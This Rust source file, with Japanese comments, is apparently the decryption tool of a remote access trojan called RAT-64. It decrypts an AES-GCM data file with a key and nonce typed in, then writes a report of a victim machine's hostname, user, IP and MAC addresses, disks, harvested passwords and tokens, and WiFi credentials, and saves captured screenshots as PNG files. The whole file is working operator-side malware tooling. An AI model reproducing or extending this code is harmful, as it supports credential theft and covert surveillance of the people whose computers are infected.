use aes_gcm::{Aes256Gcm, Nonce, KeyInit};
use aes_gcm::aead::{Aead};
use base64::{engine::general_purpose::STANDARD, Engine};
use rat_64;
use std::env;
use std::io;
// Base64 prelude不要（STANDARDを直接使用）

fn save_screenshot_base64(base64_data: &str, filename: &str) -> Result<(), Box<dyn std::error::Error>> {
    if base64_data.is_empty() {
        return Err("スクリーンショットデータが空です".into());
    }
    
    let image_data = STANDARD.decode(base64_data)?;
    std::fs::write(filename, image_data)?;
    
    Ok(())
}

fn save_all_data_to_txt(
    system_info: &rat_64::SystemInfo, 
    auth_data: &rat_64::AuthData, 
    screenshot_data: &rat_64::ScreenshotData
) -> Result<(), Box<dyn std::error::Error>> {
    let mut content = String::new();
    
    // ヘッダー
    content.push_str("===============================================\n");
    content.push_str("           RAT-64 復号化データレポート\n");
    content.push_str("===============================================\n\n");
    
    // システム情報セクション
    content.push_str("█ システム情報\n");
    content.push_str("===============================================\n");
    content.push_str(&format!("ホスト名: {}\n", system_info.hostname));
    content.push_str(&format!("ユーザー名: {}\n", system_info.username));
    content.push_str(&format!("OS名: {}\n", system_info.os_name));
    content.push_str(&format!("OSバージョン: {}\n", system_info.os_version));
    content.push_str(&format!("アーキテクチャ: {}\n", system_info.os_arch));
    content.push_str(&format!("CPU: {}\n", system_info.cpu_info));
    content.push_str(&format!("メモリ合計: {:.2}GB\n", system_info.memory_total_gb));
    content.push_str(&format!("メモリ使用可能: {:.2}GB\n", system_info.memory_available_gb));
    content.push_str(&format!("稼働時間: {:.1}時間\n", system_info.uptime_hours));
    content.push_str(&format!("ローカルIP: {}\n", system_info.local_ip));
    if let Some(ref public_ip) = system_info.public_ip {
        content.push_str(&format!("パブリックIP: {}\n", public_ip));
    }
    content.push_str(&format!("タイムゾーン: {}\n", system_info.timezone));
    content.push_str(&format!("ロケール: {}\n", system_info.locale));
    
    // ディスク情報
    content.push_str("\n▼ ディスク情報\n");
    content.push_str("-----------------------------------------------\n");
    for (i, disk) in system_info.disk_info.iter().enumerate() {
        content.push_str(&format!("ディスク{}: {}\n", i + 1, disk.drive_letter));
        content.push_str(&format!("  ファイルシステム: {}\n", disk.file_system));
        content.push_str(&format!("  合計サイズ: {:.2}GB\n", disk.total_size_gb));
        content.push_str(&format!("  空き容量: {:.2}GB\n", disk.free_space_gb));
        content.push_str(&format!("  使用率: {:.1}%\n", disk.used_percentage));
        if i < system_info.disk_info.len() - 1 {
            content.push_str("\n");
        }
    }
    
    // ネットワークインターフェース
    content.push_str("\n▼ ネットワークインターフェース\n");
    content.push_str("-----------------------------------------------\n");
    for (i, interface) in system_info.network_interfaces.iter().enumerate() {
        content.push_str(&format!("インターフェース{}: {}\n", i + 1, interface.name));
        content.push_str(&format!("  IPアドレス: {}\n", interface.ip_address));
        content.push_str(&format!("  MACアドレス: {}\n", interface.mac_address));
        content.push_str(&format!("  タイプ: {}\n", interface.interface_type));
        if i < system_info.network_interfaces.len() - 1 {
            content.push_str("\n");
        }
    }
    
    // 認証データセクション
    content.push_str("\n\n█ 認証データ\n");
    content.push_str("===============================================\n");
    
    // パスワード/トークン情報
    content.push_str("▼ パスワード/トークン情報\n");
    content.push_str("-----------------------------------------------\n");
    if auth_data.passwords.is_empty() {
        content.push_str("パスワードデータはありません\n");
    } else {
        content.push_str(&format!("総数: {}件\n\n", auth_data.passwords.len()));
        for (i, password) in auth_data.passwords.iter().enumerate() {
            content.push_str(&format!("{}. {}\n", i + 1, password));
        }
    }
    
    // WiFi認証情報
    content.push_str("\n▼ WiFi認証情報\n");
    content.push_str("-----------------------------------------------\n");
    if auth_data.wifi_creds.is_empty() {
        content.push_str("WiFi認証データはありません\n");
    } else {
        content.push_str(&format!("総数: {}件\n\n", auth_data.wifi_creds.len()));
        for (i, wifi) in auth_data.wifi_creds.iter().enumerate() {
            content.push_str(&format!("{}. {}\n", i + 1, wifi));
        }
    }
    
    // スクリーンショット情報セクション
    content.push_str("\n\n█ スクリーンショット情報\n");
    content.push_str("===============================================\n");
    content.push_str(&format!("キャプチャ時刻: {}\n", screenshot_data.capture_time));
    content.push_str(&format!("総スクリーンショット数: {}\n", screenshot_data.total_count));
    
    if screenshot_data.primary_display.is_some() {
        content.push_str("プライマリディスプレイ: primary_display.png として保存\n");
    } else {
        content.push_str("プライマリディスプレイ: なし\n");
    }
    
    if !screenshot_data.all_displays.is_empty() {
        content.push_str("\n▼ 保存されたスクリーンショット\n");
        content.push_str("-----------------------------------------------\n");
        for (i, _) in screenshot_data.all_displays.iter().enumerate() {
            content.push_str(&format!("ディスプレイ{}: display_{}.png として保存\n", i + 1, i + 1));
        }
    }
    
    // フッター
    content.push_str("\n===============================================\n");
    content.push_str("           復号化完了\n");
    content.push_str("===============================================\n");
    
    std::fs::write("decrypted_data.txt", content)?;
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        return Err("使用方法: cargo run --bin decrypt <データファイル>".into());
    }
    
    let data_file = &args[1];
    
    // ファイル存在確認
    if !std::path::Path::new(data_file).exists() {
        return Err(format!("データファイル '{}' が存在しません", data_file).into());
    }
    
    // 暗号化データを読み込み
    let encrypted_data = std::fs::read(data_file)?;
    
    // 暗号化キーとナンスの手動入力（必須）
    let mut key_input = String::new();
    io::stdin().read_line(&mut key_input)?;
    let key_input = key_input.trim();
    
    let mut nonce_input = String::new();
    io::stdin().read_line(&mut nonce_input)?;
    let nonce_input = nonce_input.trim();
    
    // Base64デコード
    let key_vec = STANDARD.decode(key_input)
        .map_err(|e| format!("キーのBase64デコードエラー: {}", e))?;
    let nonce_vec = STANDARD.decode(nonce_input)
        .map_err(|e| format!("ナンスのBase64デコードエラー: {}", e))?;
    
    // サイズ確認
    if key_vec.len() != 32 {
        return Err(format!("キーのサイズが無効です (期待: 32 bytes, 実際: {} bytes)", key_vec.len()).into());
    }
    if nonce_vec.len() != 12 {
        return Err(format!("ナンスのサイズが無効です (期待: 12 bytes, 実際: {} bytes)", nonce_vec.len()).into());
    }
    
    // 配列に変換
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&key_vec);
    nonce.copy_from_slice(&nonce_vec);
    
    let (key, nonce) = (key, nonce);
    
    // 暗号化データ全体を復号化対象とする（キー分離形式）
    let cipher_data = encrypted_data.as_slice();
    
    // 復号化
    let cipher = Aes256Gcm::new_from_slice(&key)
        .map_err(|e| format!("暗号化キーの初期化エラー: {}", e))?;
    
    let decrypted_data = cipher.decrypt(Nonce::from_slice(&nonce), cipher_data)
        .map_err(|e| format!("復号化エラー: {}", e))?;
    
    // FullData構造体を定義（メインプログラムと同じ）
    #[derive(serde::Deserialize)]
    struct FullData {
        system_info: rat_64::SystemInfo,
        auth_data: rat_64::AuthData,
        screenshot_data: rat_64::ScreenshotData,
    }
    
    let full_data: FullData = rmp_serde::from_slice(&decrypted_data)?;
    
    // 復号化成功 - サイレント処理
    
    // すべてのデータを1つのtxtファイルに保存
    let _ = save_all_data_to_txt(&full_data.system_info, &full_data.auth_data, &full_data.screenshot_data);
    
    // スクリーンショット保存（サイレント）
    if full_data.screenshot_data.total_count > 0 {
        if let Some(ref primary) = full_data.screenshot_data.primary_display {
            let _ = save_screenshot_base64(primary, "primary_display.png");
        }
        
        for (i, screenshot) in full_data.screenshot_data.all_displays.iter().enumerate() {
            let filename = format!("display_{}.png", i + 1);
            let _ = save_screenshot_base64(screenshot, &filename);
        }
    }
    Ok(())
}
